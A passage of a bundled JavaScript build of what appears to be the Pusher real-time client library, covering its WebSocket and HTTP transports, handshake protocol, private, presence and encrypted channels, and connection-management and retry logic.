              if (callbacks && callbacks.length > 0) {
                for (var i2 = 0; i2 < callbacks.length; i2++) {
                  callbacks[i2].fn.apply(callbacks[i2].context || window, args);
                }
              } else if (this.failThrough) {
                this.failThrough(eventName, data);
              }
              return this;
            }
          }
          class transport_connection_TransportConnection extends dispatcher_Dispatcher {
            constructor(hooks, name, priority, key, options) {
              super();
              this.initialize = runtime.transportConnectionInitializer;
              this.hooks = hooks;
              this.name = name;
              this.priority = priority;
              this.key = key;
              this.options = options;
              this.state = "new";
              this.timeline = options.timeline;
              this.activityTimeout = options.activityTimeout;
              this.id = this.timeline.generateUniqueID();
            }
            handlesActivityChecks() {
              return Boolean(this.hooks.handlesActivityChecks);
            }
            supportsPing() {
              return Boolean(this.hooks.supportsPing);
            }
            connect() {
              if (this.socket || this.state !== "initialized") {
                return false;
              }
              var url = this.hooks.urls.getInitial(this.key, this.options);
              try {
                this.socket = this.hooks.getSocket(url, this.options);
              } catch (e2) {
                util.defer(() => {
                  this.onError(e2);
                  this.changeState("closed");
                });
                return false;
              }
              this.bindListeners();
              logger.debug("Connecting", { transport: this.name, url });
              this.changeState("connecting");
              return true;
            }
            close() {
              if (this.socket) {
                this.socket.close();
                return true;
              } else {
                return false;
              }
            }
            send(data) {
              if (this.state === "open") {
                util.defer(() => {
                  if (this.socket) {
                    this.socket.send(data);
                  }
                });
                return true;
              } else {
                return false;
              }
            }
            ping() {
              if (this.state === "open" && this.supportsPing()) {
                this.socket.ping();
              }
            }
            onOpen() {
              if (this.hooks.beforeOpen) {
                this.hooks.beforeOpen(this.socket, this.hooks.urls.getPath(this.key, this.options));
              }
              this.changeState("open");
              this.socket.onopen = void 0;
            }
            onError(error2) {
              this.emit("error", { type: "WebSocketError", error: error2 });
              this.timeline.error(this.buildTimelineMessage({ error: error2.toString() }));
            }
            onClose(closeEvent) {
              if (closeEvent) {
                this.changeState("closed", {
                  code: closeEvent.code,
                  reason: closeEvent.reason,
                  wasClean: closeEvent.wasClean
                });
              } else {
                this.changeState("closed");
              }
              this.unbindListeners();
              this.socket = void 0;
            }
            onMessage(message) {
              this.emit("message", message);
            }
            onActivity() {
              this.emit("activity");
            }
            bindListeners() {
              this.socket.onopen = () => {
                this.onOpen();
              };
              this.socket.onerror = (error2) => {
                this.onError(error2);
              };
              this.socket.onclose = (closeEvent) => {
                this.onClose(closeEvent);
              };
              this.socket.onmessage = (message) => {
                this.onMessage(message);
              };
              if (this.supportsPing()) {
                this.socket.onactivity = () => {
                  this.onActivity();
                };
              }
            }
            unbindListeners() {
              if (this.socket) {
                this.socket.onopen = void 0;
                this.socket.onerror = void 0;
                this.socket.onclose = void 0;
                this.socket.onmessage = void 0;
                if (this.supportsPing()) {
                  this.socket.onactivity = void 0;
                }
              }
            }
            changeState(state2, params) {
              this.state = state2;
              this.timeline.info(this.buildTimelineMessage({
                state: state2,
                params
              }));
              this.emit(state2, params);
            }
            buildTimelineMessage(message) {
              return extend({ cid: this.id }, message);
            }
          }
          class transport_Transport {
            constructor(hooks) {
              this.hooks = hooks;
            }
            isSupported(environment) {
              return this.hooks.isSupported(environment);
            }
            createConnection(name, priority, key, options) {
              return new transport_connection_TransportConnection(this.hooks, name, priority, key, options);
            }
          }
          var WSTransport = new transport_Transport({
            urls: ws,
            handlesActivityChecks: false,
            supportsPing: false,
            isInitialized: function() {
              return Boolean(runtime.getWebSocketAPI());
            },
            isSupported: function() {
              return Boolean(runtime.getWebSocketAPI());
            },
            getSocket: function(url) {
              return runtime.createWebSocket(url);
            }
          });
          var httpConfiguration = {
            urls: http,
            handlesActivityChecks: false,
            supportsPing: true,
            isInitialized: function() {
              return true;
            }
          };
          var streamingConfiguration = extend({
            getSocket: function(url) {
              return runtime.HTTPFactory.createStreamingSocket(url);
            }
          }, httpConfiguration);
          var pollingConfiguration = extend({
            getSocket: function(url) {
              return runtime.HTTPFactory.createPollingSocket(url);
            }
          }, httpConfiguration);
          var xhrConfiguration = {
            isSupported: function() {
              return runtime.isXHRSupported();
            }
          };
          var XHRStreamingTransport = new transport_Transport(extend({}, streamingConfiguration, xhrConfiguration));
          var XHRPollingTransport = new transport_Transport(extend({}, pollingConfiguration, xhrConfiguration));
          var Transports = {
            ws: WSTransport,
            xhr_streaming: XHRStreamingTransport,
            xhr_polling: XHRPollingTransport
          };
          var transports = Transports;
          var SockJSTransport = new transport_Transport({
            file: "sockjs",
            urls: sockjs,
            handlesActivityChecks: true,
            supportsPing: false,
            isSupported: function() {
              return true;
            },
            isInitialized: function() {
              return window.SockJS !== void 0;
            },
            getSocket: function(url, options) {
              return new window.SockJS(url, null, {
                js_path: Dependencies.getPath("sockjs", {
                  useTLS: options.useTLS
                }),
                ignore_null_origin: options.ignoreNullOrigin
              });
            },
            beforeOpen: function(socket, path) {
              socket.send(JSON.stringify({
                path
              }));
            }
          });
          var xdrConfiguration = {
            isSupported: function(environment) {
              var yes = runtime.isXDRSupported(environment.useTLS);
              return yes;
            }
          };
          var XDRStreamingTransport = new transport_Transport(extend({}, streamingConfiguration, xdrConfiguration));
          var XDRPollingTransport = new transport_Transport(extend({}, pollingConfiguration, xdrConfiguration));
          transports.xdr_streaming = XDRStreamingTransport;
          transports.xdr_polling = XDRPollingTransport;
          transports.sockjs = SockJSTransport;
          var transports_transports = transports;
          class net_info_NetInfo extends dispatcher_Dispatcher {
            constructor() {
              super();
              var self = this;
              if (window.addEventListener !== void 0) {
                window.addEventListener("online", function() {
                  self.emit("online");
                }, false);
                window.addEventListener("offline", function() {
                  self.emit("offline");
                }, false);
              }
            }
            isOnline() {
              if (window.navigator.onLine === void 0) {
                return true;
              } else {
                return window.navigator.onLine;
              }
            }
          }
          var net_info_Network = new net_info_NetInfo();
          class assistant_to_the_transport_manager_AssistantToTheTransportManager {
            constructor(manager, transport, options) {
              this.manager = manager;
              this.transport = transport;
              this.minPingDelay = options.minPingDelay;
              this.maxPingDelay = options.maxPingDelay;
              this.pingDelay = void 0;
            }
            createConnection(name, priority, key, options) {
              options = extend({}, options, {
                activityTimeout: this.pingDelay
              });
              var connection = this.transport.createConnection(name, priority, key, options);
              var openTimestamp = null;
              var onOpen = function() {
                connection.unbind("open", onOpen);
                connection.bind("closed", onClosed);
                openTimestamp = util.now();
              };
              var onClosed = (closeEvent) => {
                connection.unbind("closed", onClosed);
                if (closeEvent.code === 1002 || closeEvent.code === 1003) {
                  this.manager.reportDeath();
                } else if (!closeEvent.wasClean && openTimestamp) {
                  var lifespan = util.now() - openTimestamp;
                  if (lifespan < 2 * this.maxPingDelay) {
                    this.manager.reportDeath();
                    this.pingDelay = Math.max(lifespan / 2, this.minPingDelay);
                  }
                }
              };
              connection.bind("open", onOpen);
              return connection;
            }
            isSupported(environment) {
              return this.manager.isAlive() && this.transport.isSupported(environment);
            }
          }
          const Protocol = {
            decodeMessage: function(messageEvent) {
              try {
                var messageData = JSON.parse(messageEvent.data);
                var pusherEventData = messageData.data;
                if (typeof pusherEventData === "string") {
                  try {
                    pusherEventData = JSON.parse(messageData.data);
                  } catch (e2) {
                  }
                }
                var pusherEvent = {
                  event: messageData.event,
                  channel: messageData.channel,
                  data: pusherEventData
                };
                if (messageData.user_id) {
                  pusherEvent.user_id = messageData.user_id;
                }
                return pusherEvent;
              } catch (e2) {
                throw { type: "MessageParseError", error: e2, data: messageEvent.data };
              }
            },
            encodeMessage: function(event) {
              return JSON.stringify(event);
            },
            processHandshake: function(messageEvent) {
              var message = Protocol.decodeMessage(messageEvent);
              if (message.event === "pusher:connection_established") {
                if (!message.data.activity_timeout) {
                  throw "No activity timeout specified in handshake";
                }
                return {
                  action: "connected",
                  id: message.data.socket_id,
                  activityTimeout: message.data.activity_timeout * 1e3
                };
              } else if (message.event === "pusher:error") {
                return {
                  action: this.getCloseAction(message.data),
                  error: this.getCloseError(message.data)
                };
              } else {
                throw "Invalid handshake";
              }
            },
            getCloseAction: function(closeEvent) {
              if (closeEvent.code < 4e3) {
                if (closeEvent.code >= 1002 && closeEvent.code <= 1004) {
                  return "backoff";
                } else {
                  return null;
                }
              } else if (closeEvent.code === 4e3) {
                return "tls_only";
              } else if (closeEvent.code < 4100) {
                return "refused";
              } else if (closeEvent.code < 4200) {
                return "backoff";
              } else if (closeEvent.code < 4300) {
                return "retry";
              } else {
                return "refused";
              }
            },
            getCloseError: function(closeEvent) {
              if (closeEvent.code !== 1e3 && closeEvent.code !== 1001) {
                return {
                  type: "PusherError",
                  data: {
                    code: closeEvent.code,
                    message: closeEvent.reason || closeEvent.message
                  }
                };
              } else {
                return null;
              }
            }
          };
          var protocol_protocol = Protocol;
          class connection_Connection extends dispatcher_Dispatcher {
            constructor(id, transport) {
              super();
              this.id = id;
              this.transport = transport;
              this.activityTimeout = transport.activityTimeout;
              this.bindListeners();
            }
            handlesActivityChecks() {
              return this.transport.handlesActivityChecks();
            }
            send(data) {
              return this.transport.send(data);
            }
            send_event(name, data, channel) {
              var event = { event: name, data };
              if (channel) {
                event.channel = channel;
              }
              logger.debug("Event sent", event);
              return this.send(protocol_protocol.encodeMessage(event));
            }
            ping() {
              if (this.transport.supportsPing()) {
                this.transport.ping();
              } else {
                this.send_event("pusher:ping", {});
              }
            }
            close() {
              this.transport.close();
            }
            bindListeners() {
              var listeners = {
                message: (messageEvent) => {
                  var pusherEvent;
                  try {
                    pusherEvent = protocol_protocol.decodeMessage(messageEvent);
                  } catch (e2) {
                    this.emit("error", {
                      type: "MessageParseError",
                      error: e2,
                      data: messageEvent.data
                    });
                  }
                  if (pusherEvent !== void 0) {
                    logger.debug("Event recd", pusherEvent);
                    switch (pusherEvent.event) {
                      case "pusher:error":
                        this.emit("error", {
                          type: "PusherError",
                          data: pusherEvent.data
                        });
                        break;
                      case "pusher:ping":
                        this.emit("ping");
                        break;
                      case "pusher:pong":
                        this.emit("pong");
                        break;
                    }
                    this.emit("message", pusherEvent);
                  }
                },
                activity: () => {
                  this.emit("activity");
                },
                error: (error2) => {
                  this.emit("error", error2);
                },
                closed: (closeEvent) => {
                  unbindListeners();
                  if (closeEvent && closeEvent.code) {
                    this.handleCloseEvent(closeEvent);
                  }
                  this.transport = null;
                  this.emit("closed");
                }
              };
              var unbindListeners = () => {
                objectApply(listeners, (listener, event) => {
                  this.transport.unbind(event, listener);
                });
              };
              objectApply(listeners, (listener, event) => {
                this.transport.bind(event, listener);
              });
            }
            handleCloseEvent(closeEvent) {
              var action = protocol_protocol.getCloseAction(closeEvent);
              var error2 = protocol_protocol.getCloseError(closeEvent);
              if (error2) {
                this.emit("error", error2);
              }
              if (action) {
                this.emit(action, { action, error: error2 });
              }
            }
          }
          class handshake_Handshake {
            constructor(transport, callback) {
              this.transport = transport;
              this.callback = callback;
              this.bindListeners();
            }
            close() {
              this.unbindListeners();
              this.transport.close();
            }
            bindListeners() {
              this.onMessage = (m3) => {
                this.unbindListeners();
                var result;
                try {
                  result = protocol_protocol.processHandshake(m3);
                } catch (e2) {
                  this.finish("error", { error: e2 });
                  this.transport.close();
                  return;
                }
                if (result.action === "connected") {
                  this.finish("connected", {
                    connection: new connection_Connection(result.id, this.transport),
                    activityTimeout: result.activityTimeout
                  });
                } else {
                  this.finish(result.action, { error: result.error });
                  this.transport.close();
                }
              };
              this.onClosed = (closeEvent) => {
                this.unbindListeners();
                var action = protocol_protocol.getCloseAction(closeEvent) || "backoff";
                var error2 = protocol_protocol.getCloseError(closeEvent);
                this.finish(action, { error: error2 });
              };
              this.transport.bind("message", this.onMessage);
              this.transport.bind("closed", this.onClosed);
            }
            unbindListeners() {
              this.transport.unbind("message", this.onMessage);
              this.transport.unbind("closed", this.onClosed);
            }
            finish(action, params) {
              this.callback(extend({ transport: this.transport, action }, params));
            }
          }
          class timeline_sender_TimelineSender {
            constructor(timeline, options) {
              this.timeline = timeline;
              this.options = options || {};
            }
            send(useTLS, callback) {
              if (this.timeline.isEmpty()) {
                return;
              }
              this.timeline.send(runtime.TimelineTransport.getAgent(this, useTLS), callback);
            }
          }
          class channel_Channel extends dispatcher_Dispatcher {
            constructor(name, pusher2) {
              super(function(event, data) {
                logger.debug("No callbacks on " + name + " for " + event);
              });
              this.name = name;
              this.pusher = pusher2;
              this.subscribed = false;
              this.subscriptionPending = false;
              this.subscriptionCancelled = false;
            }
            authorize(socketId, callback) {
              return callback(null, { auth: "" });
            }
            trigger(event, data) {
              if (event.indexOf("client-") !== 0) {
                throw new BadEventName("Event '" + event + "' does not start with 'client-'");
              }
              if (!this.subscribed) {
                var suffix = url_store.buildLogSuffix("triggeringClientEvents");
                logger.warn(`Client event triggered before channel 'subscription_succeeded' event . ${suffix}`);
              }
              return this.pusher.send_event(event, data, this.name);
            }
            disconnect() {
              this.subscribed = false;
              this.subscriptionPending = false;
            }
            handleEvent(event) {
              var eventName = event.event;
              var data = event.data;
              if (eventName === "pusher_internal:subscription_succeeded") {
                this.handleSubscriptionSucceededEvent(event);
              } else if (eventName === "pusher_internal:subscription_count") {
                this.handleSubscriptionCountEvent(event);
              } else if (eventName.indexOf("pusher_internal:") !== 0) {
                var metadata = {};
                this.emit(eventName, data, metadata);
              }
            }
            handleSubscriptionSucceededEvent(event) {
              this.subscriptionPending = false;
              this.subscribed = true;
              if (this.subscriptionCancelled) {
                this.pusher.unsubscribe(this.name);
              } else {
                this.emit("pusher:subscription_succeeded", event.data);
              }
            }
            handleSubscriptionCountEvent(event) {
              if (event.data.subscription_count) {
                this.subscriptionCount = event.data.subscription_count;
              }
              this.emit("pusher:subscription_count", event.data);
            }
            subscribe() {
              if (this.subscribed) {
                return;
              }
              this.subscriptionPending = true;
              this.subscriptionCancelled = false;
              this.authorize(this.pusher.connection.socket_id, (error2, data) => {
                if (error2) {
                  this.subscriptionPending = false;
                  logger.error(error2.toString());
                  this.emit("pusher:subscription_error", Object.assign({}, {
                    type: "AuthError",
                    error: error2.message
                  }, error2 instanceof HTTPAuthError ? { status: error2.status } : {}));
                } else {
                  this.pusher.send_event("pusher:subscribe", {
                    auth: data.auth,
                    channel_data: data.channel_data,
                    channel: this.name
                  });
                }
              });
            }
            unsubscribe() {
              this.subscribed = false;
              this.pusher.send_event("pusher:unsubscribe", {
                channel: this.name
              });
            }
            cancelSubscription() {
              this.subscriptionCancelled = true;
            }
            reinstateSubscription() {
              this.subscriptionCancelled = false;
            }
          }
          class private_channel_PrivateChannel extends channel_Channel {
            authorize(socketId, callback) {
              return this.pusher.config.channelAuthorizer({
                channelName: this.name,
                socketId
              }, callback);
            }
          }
          class members_Members {
            constructor() {
              this.reset();
            }
            get(id) {
              if (Object.prototype.hasOwnProperty.call(this.members, id)) {
                return {
                  id,
                  info: this.members[id]
                };
              } else {
                return null;
              }
            }
            each(callback) {
              objectApply(this.members, (member, id) => {
                callback(this.get(id));
              });
            }
            setMyID(id) {
              this.myID = id;
            }
            onSubscription(subscriptionData) {
              this.members = subscriptionData.presence.hash;
              this.count = subscriptionData.presence.count;
              this.me = this.get(this.myID);
            }
            addMember(memberData) {
              if (this.get(memberData.user_id) === null) {
                this.count++;
              }
              this.members[memberData.user_id] = memberData.user_info;
              return this.get(memberData.user_id);
            }
            removeMember(memberData) {
              var member = this.get(memberData.user_id);
              if (member) {
                delete this.members[memberData.user_id];
                this.count--;
              }
              return member;
            }
            reset() {
              this.members = {};
              this.count = 0;
              this.myID = null;
              this.me = null;
            }
          }
          var __awaiter = function(thisArg, _arguments, P, generator) {
            function adopt(value) {
              return value instanceof P ? value : new P(function(resolve) {
                resolve(value);
              });
            }
            return new (P || (P = Promise))(function(resolve, reject) {
              function fulfilled(value) {
                try {
                  step(generator.next(value));
                } catch (e2) {
                  reject(e2);
                }
              }
              function rejected(value) {
                try {
                  step(generator["throw"](value));
                } catch (e2) {
                  reject(e2);
                }
              }
              function step(result) {
                result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected);
              }
              step((generator = generator.apply(thisArg, _arguments || [])).next());
            });
          };
          class presence_channel_PresenceChannel extends private_channel_PrivateChannel {
            constructor(name, pusher2) {
              super(name, pusher2);
              this.members = new members_Members();
            }
            authorize(socketId, callback) {
              super.authorize(socketId, (error2, authData) => __awaiter(this, void 0, void 0, function* () {
                if (!error2) {
                  authData = authData;
                  if (authData.channel_data != null) {
                    var channelData = JSON.parse(authData.channel_data);
                    this.members.setMyID(channelData.user_id);
                  } else {
                    yield this.pusher.user.signinDonePromise;
                    if (this.pusher.user.user_data != null) {
                      this.members.setMyID(this.pusher.user.user_data.id);
                    } else {
                      let suffix = url_store.buildLogSuffix("authorizationEndpoint");
                      logger.error(`Invalid auth response for channel '${this.name}', expected 'channel_data' field. ${suffix}, or the user should be signed in.`);
                      callback("Invalid auth response");
                      return;
                    }
                  }
                }
                callback(error2, authData);
              }));
            }
            handleEvent(event) {
              var eventName = event.event;
              if (eventName.indexOf("pusher_internal:") === 0) {
                this.handleInternalEvent(event);
              } else {
                var data = event.data;
                var metadata = {};
                if (event.user_id) {
                  metadata.user_id = event.user_id;
                }
                this.emit(eventName, data, metadata);
              }
            }
            handleInternalEvent(event) {
              var eventName = event.event;
              var data = event.data;
              switch (eventName) {
                case "pusher_internal:subscription_succeeded":
                  this.handleSubscriptionSucceededEvent(event);
                  break;
                case "pusher_internal:subscription_count":
                  this.handleSubscriptionCountEvent(event);
                  break;
                case "pusher_internal:member_added":
                  var addedMember = this.members.addMember(data);
                  this.emit("pusher:member_added", addedMember);
                  break;
                case "pusher_internal:member_removed":
                  var removedMember = this.members.removeMember(data);
                  if (removedMember) {
                    this.emit("pusher:member_removed", removedMember);
                  }
                  break;
              }
            }
            handleSubscriptionSucceededEvent(event) {
              this.subscriptionPending = false;
              this.subscribed = true;
              if (this.subscriptionCancelled) {
                this.pusher.unsubscribe(this.name);
              } else {
                this.members.onSubscription(event.data);
                this.emit("pusher:subscription_succeeded", this.members);
              }
            }
            disconnect() {
              this.members.reset();
              super.disconnect();
            }
          }
          var utf8 = __webpack_require__(1);
          var base64 = __webpack_require__(0);
          class encrypted_channel_EncryptedChannel extends private_channel_PrivateChannel {
            constructor(name, pusher2, nacl) {
              super(name, pusher2);
              this.key = null;
              this.nacl = nacl;
            }
            authorize(socketId, callback) {
              super.authorize(socketId, (error2, authData) => {
                if (error2) {
                  callback(error2, authData);
                  return;
                }
                let sharedSecret = authData["shared_secret"];
                if (!sharedSecret) {
                  callback(new Error(`No shared_secret key in auth payload for encrypted channel: ${this.name}`), null);
                  return;
                }
                this.key = Object(base64["decode"])(sharedSecret);
                delete authData["shared_secret"];
                callback(null, authData);
              });
            }
            trigger(event, data) {
              throw new UnsupportedFeature("Client events are not currently supported for encrypted channels");
            }
            handleEvent(event) {
              var eventName = event.event;
              var data = event.data;
              if (eventName.indexOf("pusher_internal:") === 0 || eventName.indexOf("pusher:") === 0) {
                super.handleEvent(event);
                return;
              }
              this.handleEncryptedEvent(eventName, data);
            }
            handleEncryptedEvent(event, data) {
              if (!this.key) {
                logger.debug("Received encrypted event before key has been retrieved from the authEndpoint");
                return;
              }
              if (!data.ciphertext || !data.nonce) {
                logger.error("Unexpected format for encrypted event, expected object with `ciphertext` and `nonce` fields, got: " + data);
                return;
              }
              let cipherText = Object(base64["decode"])(data.ciphertext);
              if (cipherText.length < this.nacl.secretbox.overheadLength) {
                logger.error(`Expected encrypted event ciphertext length to be ${this.nacl.secretbox.overheadLength}, got: ${cipherText.length}`);
                return;
              }
              let nonce = Object(base64["decode"])(data.nonce);
              if (nonce.length < this.nacl.secretbox.nonceLength) {
                logger.error(`Expected encrypted event nonce length to be ${this.nacl.secretbox.nonceLength}, got: ${nonce.length}`);
                return;
              }
              let bytes = this.nacl.secretbox.open(cipherText, nonce, this.key);
              if (bytes === null) {
                logger.debug("Failed to decrypt an event, probably because it was encrypted with a different key. Fetching a new key from the authEndpoint...");
                this.authorize(this.pusher.connection.socket_id, (error2, authData) => {
                  if (error2) {
                    logger.error(`Failed to make a request to the authEndpoint: ${authData}. Unable to fetch new key, so dropping encrypted event`);
                    return;
                  }
                  bytes = this.nacl.secretbox.open(cipherText, nonce, this.key);
                  if (bytes === null) {
                    logger.error(`Failed to decrypt event with new key. Dropping encrypted event`);
                    return;
                  }
                  this.emit(event, this.getDataToEmit(bytes));
                  return;
                });
                return;
              }
              this.emit(event, this.getDataToEmit(bytes));
            }
            getDataToEmit(bytes) {
              let raw = Object(utf8["decode"])(bytes);
              try {
                return JSON.parse(raw);
              } catch (_a) {
                return raw;
              }
            }
          }
          class connection_manager_ConnectionManager extends dispatcher_Dispatcher {
            constructor(key, options) {
              super();
              this.state = "initialized";
              this.connection = null;
              this.key = key;
              this.options = options;
              this.timeline = this.options.timeline;
              this.usingTLS = this.options.useTLS;
              this.errorCallbacks = this.buildErrorCallbacks();
              this.connectionCallbacks = this.buildConnectionCallbacks(this.errorCallbacks);
              this.handshakeCallbacks = this.buildHandshakeCallbacks(this.errorCallbacks);
              var Network = runtime.getNetwork();
              Network.bind("online", () => {
                this.timeline.info({ netinfo: "online" });
                if (this.state === "connecting" || this.state === "unavailable") {
                  this.retryIn(0);
                }
              });
              Network.bind("offline", () => {
                this.timeline.info({ netinfo: "offline" });
                if (this.connection) {
                  this.sendActivityCheck();
                }
              });
              this.updateStrategy();
            }
            switchCluster(key) {
              this.key = key;
              this.updateStrategy();
              this.retryIn(0);
            }
            connect() {
              if (this.connection || this.runner) {
                return;
              }
              if (!this.strategy.isSupported()) {
                this.updateState("failed");
                return;
              }
              this.updateState("connecting");
              this.startConnecting();
              this.setUnavailableTimer();
            }
            send(data) {
              if (this.connection) {
                return this.connection.send(data);
              } else {
                return false;
              }
            }
            send_event(name, data, channel) {
              if (this.connection) {
                return this.connection.send_event(name, data, channel);
              } else {
                return false;
              }
            }
            disconnect() {
              this.disconnectInternally();
              this.updateState("disconnected");
            }
            isUsingTLS() {
              return this.usingTLS;
            }
            startConnecting() {
              var callback = (error2, handshake) => {
                if (error2) {
                  this.runner = this.strategy.connect(0, callback);
                } else {
                  if (handshake.action === "error") {
                    this.emit("error", {
                      type: "HandshakeError",
                      error: handshake.error
                    });
                    this.timeline.error({ handshakeError: handshake.error });
                  } else {
                    this.abortConnecting();
                    this.handshakeCallbacks[handshake.action](handshake);
                  }
                }
              };
              this.runner = this.strategy.connect(0, callback);
            }
            abortConnecting() {
              if (this.runner) {
                this.runner.abort();
                this.runner = null;
              }
            }
            disconnectInternally() {
              this.abortConnecting();
              this.clearRetryTimer();
              this.clearUnavailableTimer();
              if (this.connection) {
                var connection = this.abandonConnection();
                connection.close();
              }
            }
            updateStrategy() {
              this.strategy = this.options.getStrategy({
                key: this.key,
                timeline: this.timeline,
                useTLS: this.usingTLS
              });
            }
            retryIn(delay) {
              this.timeline.info({ action: "retry", delay });
              if (delay > 0) {
                this.emit("connecting_in", Math.round(delay / 1e3));
              }
              this.retryTimer = new timers_OneOffTimer(delay || 0, () => {
                this.disconnectInternally();
                this.connect();
              });
            }
            clearRetryTimer() {
              if (this.retryTimer) {
                this.retryTimer.ensureAborted();
                this.retryTimer = null;
              }
            }
            setUnavailableTimer() {
              this.unavailableTimer = new timers_OneOffTimer(this.options.unavailableTimeout, () => {
                this.updateState("unavailable");
              });
            }
            clearUnavailableTimer() {
              if (this.unavailableTimer) {
                this.unavailableTimer.ensureAborted();
              }
            }
            sendActivityCheck() {
              this.stopActivityCheck();
              this.connection.ping();
              this.activityTimer = new timers_OneOffTimer(this.options.pongTimeout, () => {
                this.timeline.error({ pong_timed_out: this.options.pongTimeout });
                this.retryIn(0);
              });
            }
            resetActivityCheck() {
              this.stopActivityCheck();
              if (this.connection && !this.connection.handlesActivityChecks()) {
                this.activityTimer = new timers_OneOffTimer(this.activityTimeout, () => {
                  this.sendActivityCheck();
                });
              }
            }
            stopActivityCheck() {
              if (this.activityTimer) {
                this.activityTimer.ensureAborted();
              }
            }
            buildConnectionCallbacks(errorCallbacks) {
              return extend({}, errorCallbacks, {
                message: (message) => {
                  this.resetActivityCheck();
                  this.emit("message", message);
                },
                ping: () => {
                  this.send_event("pusher:pong", {});
                },
                activity: () => {
                  this.resetActivityCheck();
                },
                error: (error2) => {
                  this.emit("error", error2);
                },
                closed: () => {
                  this.abandonConnection();
                  if (this.shouldRetry()) {
                    this.retryIn(1e3);
                  }
                }
              });
            }
            buildHandshakeCallbacks(errorCallbacks) {
              return extend({}, errorCallbacks, {
                connected: (handshake) => {
                  this.activityTimeout = Math.min(this.options.activityTimeout, handshake.activityTimeout, handshake.connection.activityTimeout || Infinity);
                  this.clearUnavailableTimer();
                  this.setConnection(handshake.connection);
                  this.socket_id = this.connection.id;
                  this.updateState("connected", { socket_id: this.socket_id });
                }
              });
            }
            buildErrorCallbacks() {
              let withErrorEmitted = (callback) => {
                return (result) => {
                  if (result.error) {
                    this.emit("error", { type: "WebSocketError", error: result.error });
                  }
                  callback(result);
                };
              };
              return {
                tls_only: withErrorEmitted(() => {
                  this.usingTLS = true;
                  this.updateStrategy();
                  this.retryIn(0);
                }),
                refused: withErrorEmitted(() => {
                  this.disconnect();
                }),
                backoff: withErrorEmitted(() => {
                  this.retryIn(1e3);
                }),
                retry: withErrorEmitted(() => {
                  this.retryIn(0);
                })
              };
            }
            setConnection(connection) {
              this.connection = connection;
              for (var event in this.connectionCallbacks) {
                this.connection.bind(event, this.connectionCallbacks[event]);
              }
              this.resetActivityCheck();
            }
            abandonConnection() {
              if (!this.connection) {
                return;
              }
              this.stopActivityCheck();
              for (var event in this.connectionCallbacks) {
                this.connection.unbind(event, this.connectionCallbacks[event]);
              }
              var connection = this.connection;
              this.connection = null;
              return connection;
            }
            updateState(newState, data) {
              var previousState = this.state;
              this.state = newState;
              if (previousState !== newState) {
                var newStateDescription = newState;
                if (newStateDescription === "connected") {
                  newStateDescription += " with new socket ID " + data.socket_id;
                }
                logger.debug("State changed", previousState + " -> " + newStateDescription);
                this.timeline.info({ state: newState, params: data });
                this.emit("state_change", { previous: previousState, current: newState });
                this.emit(newState, data);
              }
            }
            shouldRetry() {
              return this.state === "connecting" || this.state === "connected";
            }
          }
          class channels_Channels {
            constructor() {
              this.channels = {};
            }
            add(name, pusher2) {
              if (!this.channels[name]) {
                this.channels[name] = createChannel(name, pusher2);
              }
              return this.channels[name];
            }
            all() {
              return values(this.channels);
            }
            find(name) {
              return this.channels[name];
            }
            remove(name) {
              var channel = this.channels[name];
              delete this.channels[name];
              return channel;
            }
            disconnect() {
              objectApply(this.channels, function(channel) {
                channel.disconnect();
              });
            }
          }
          function createChannel(name, pusher2) {
            if (name.indexOf("private-encrypted-") === 0) {
              if (pusher2.config.nacl) {
                return factory.createEncryptedChannel(name, pusher2, pusher2.config.nacl);
              }
              let errMsg = "Tried to subscribe to a private-encrypted- channel but no nacl implementation available";
              let suffix = url_store.buildLogSuffix("encryptedChannelSupport");
              throw new UnsupportedFeature(`${errMsg}. ${suffix}`);
            } else if (name.indexOf("private-") === 0) {
              return factory.createPrivateChannel(name, pusher2);
            } else if (name.indexOf("presence-") === 0) {
              return factory.createPresenceChannel(name, pusher2);
            } else if (name.indexOf("#") === 0) {
              throw new BadChannelName('Cannot create a channel with name "' + name + '".');
            } else {
              return factory.createChannel(name, pusher2);
            }
          }
          var Factory = {
            createChannels() {
              return new channels_Channels();
            },
            createConnectionManager(key, options) {
              return new connection_manager_ConnectionManager(key, options);
            },
            createChannel(name, pusher2) {
              return new channel_Channel(name, pusher2);
            },
            createPrivateChannel(name, pusher2) {
              return new private_channel_PrivateChannel(name, pusher2);
            },
            createPresenceChannel(name, pusher2) {
              return new presence_channel_PresenceChannel(name, pusher2);
            },
            createEncryptedChannel(name, pusher2, nacl) {
              return new encrypted_channel_EncryptedChannel(name, pusher2, nacl);
            },
            createTimelineSender(timeline, options) {
              return new timeline_sender_TimelineSender(timeline, options);
            },
            createHandshake(transport, callback) {
              return new handshake_Handshake(transport, callback);
            },
            createAssistantToTheTransportManager(manager, transport, options) {
              return new assistant_to_the_transport_manager_AssistantToTheTransportManager(manager, transport, options);
            }
          };
          var factory = Factory;
          class transport_manager_TransportManager {
            constructor(options) {
              this.options = options || {};
              this.livesLeft = this.options.lives || Infinity;
            }
            getAssistant(transport) {
              return factory.createAssistantToTheTransportManager(this, transport, {
                minPingDelay: this.options.minPingDelay,
                maxPingDelay: this.options.maxPingDelay
              });
            }
            isAlive() {
              return this.livesLeft > 0;
            }
            reportDeath() {
              this.livesLeft -= 1;
            }
          }
          class sequential_strategy_SequentialStrategy {
            constructor(strategies, options) {
              this.strategies = strategies;
              this.loop = Boolean(options.loop);
              this.failFast = Boolean(options.failFast);
              this.timeout = options.timeout;
              this.timeoutLimit = options.timeoutLimit;
            }
            isSupported() {
              return any(this.strategies, util.method("isSupported"));
            }
            connect(minPriority, callback) {
              var strategies = this.strategies;
              var current = 0;
              var timeout = this.timeout;
              var runner = null;
              var tryNextStrategy = (error2, handshake) => {
                if (handshake) {
                  callback(null, handshake);
                } else {
                  current = current + 1;
                  if (this.loop) {
                    current = current % strategies.length;
                  }
                  if (current < strategies.length) {
                    if (timeout) {
                      timeout = timeout * 2;
                      if (this.timeoutLimit) {
                        timeout = Math.min(timeout, this.timeoutLimit);
                      }
                    }
                    runner = this.tryStrategy(strategies[current], minPriority, { timeout, failFast: this.failFast }, tryNextStrategy);
                  } else {
                    callback(true);
                  }
                }
              };
              runner = this.tryStrategy(strategies[current], minPriority, { timeout, failFast: this.failFast }, tryNextStrategy);
              return {
                abort: function() {
                  runner.abort();
                },
                forceMinPriority: function(p) {
                  minPriority = p;
                  if (runner) {
                    runner.forceMinPriority(p);
                  }
                }
              };
            }
            tryStrategy(strategy, minPriority, options, callback) {
              var timer = null;
              var runner = null;
              if (options.timeout > 0) {
                timer = new timers_OneOffTimer(options.timeout, function() {
                  runner.abort();
                  callback(true);
                });
